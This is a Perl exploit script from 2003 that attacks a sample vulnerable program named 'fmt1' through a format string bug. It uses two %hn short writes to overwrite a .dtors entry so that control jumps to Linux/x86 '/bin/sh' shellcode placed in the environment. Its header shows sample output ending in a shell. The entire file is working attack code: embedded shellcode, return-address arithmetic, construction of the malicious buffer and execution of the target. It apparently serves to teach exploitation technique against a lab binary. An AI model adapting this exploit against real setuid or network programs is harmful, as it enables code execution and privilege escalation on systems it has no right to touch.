#!/usr/bin/perl

#
# $Id: fmt1-ex2.pl,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
#
# fmt1-ex2.pl - fmt1.c exploit (format string exploitation)
# Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# This time we use the short write technique (with the %hn parameter), with
# just 2 large write operations. This technique has one major advantage over
# the one used in the original fmt1-ex.pl: it does not destroy data beside
# the address, to preserve valuable data behind the address we are overwriting.
#
# Scut writes (see http://www.team-teso.net/articles/formatstring): 
# "In general you should avoid it, although it is supported by most C 
# libraries: it is dependant on the behaviour of the format function, namely 
# if the internal counter of written chars can exceed the buffer boundary. 
# This does not work on old GNU C libraries (libc5). Also it consumes more 
# memory in the target process."
#
# This technique is especially useful for RISC-based systems, which have
# alignment restrictions for the %n directive. 
#
# Usage: ./fmt1-ex2.pl <numbers of stackpops> (default = 0)
#
# $ uname -a
# Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
# $ gcc --version
# 2.95.4
# $ ./fmt1-ex2.pl 2
# Using .dtors address    : 0x80495b0
# Using ret address       : 0xbfffffdc
# Using 2 stackpop(s)     : "%.10u%.10u"
# Using write string      : "%.65468u%hn%.49187u%hn"
# [...]
# sh-2.05a$
#
# NOTE. Practice has shown that one single large write doesn't work on most 
# systems (see also http://bgman.net/docs/format-strings.txt, by portal).
#

$vuln =		"./fmt1";		# this is the vulnerable program
$dtors = 	0x080495ac + 4;		# address of first pointer in .dtors
$dummy = 	"AAAA";			# dummy double-word for stack filling

$sc = # linux/x86 shellcode (24 bytes)
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

# clean the environment
foreach $key (keys %ENV) {
	delete $ENV{$key};
}
# put our shellcode in environment
$ENV{SC} = $sc;

# calculate the ret address and split it in 2 words
$ret = 0xbffffffa - length($sc) - length($vuln);
$ret1 = ($ret & 0x0000ffff);
$ret2 = ($ret & 0xffff0000) >> 16;

# build the address part of the format string
$fmt_address =	pack("L", $dtors) . 
		$dummy .
		pack("L", $dtors + 2);

# try different numbers of stackpops (default = 0)
$fmt_stackpop = "%.10u";
$fmt_stackpop = $fmt_stackpop x $ARGV[0];

# bytes written so far (address + stackpop)
$base = length($fmt_address) + length($fmt_stackpop) * 2;

# calculate numeric arguments for the write string
$n1 = ($ret1 - $base) 			% 0x10000;
$n2 = ($ret2 - $base - $n1) 		% 0x10000;

# check for potentially dangerous numeric arguments below 10
$n1 += 0x10000 if ($n1 < 10);
$n2 += 0x10000 if ($n2 < 10);

# build the write string part of the format string
$fmt_write = 	"%." . $n1 . "u%hn" .
		"%." . $n2 . "u%hn";

# print some output
printf "Using .dtors address\t: 0x%x\n", $dtors;
printf "Using ret address\t: 0x%x\n", $ret;
printf "Using %d stackpop(s)\t: \"%s\"\n", $ARGV[0], $fmt_stackpop;
printf "Using write string\t: \"%%.%du%%hn%%.%du%%hn\"\n\n",
	$n1, $n2;

# build the malicious buffer
$buf = 	$fmt_address . $fmt_stackpop . $fmt_write;

# run the vulnerable program
exec $vuln, $buf;
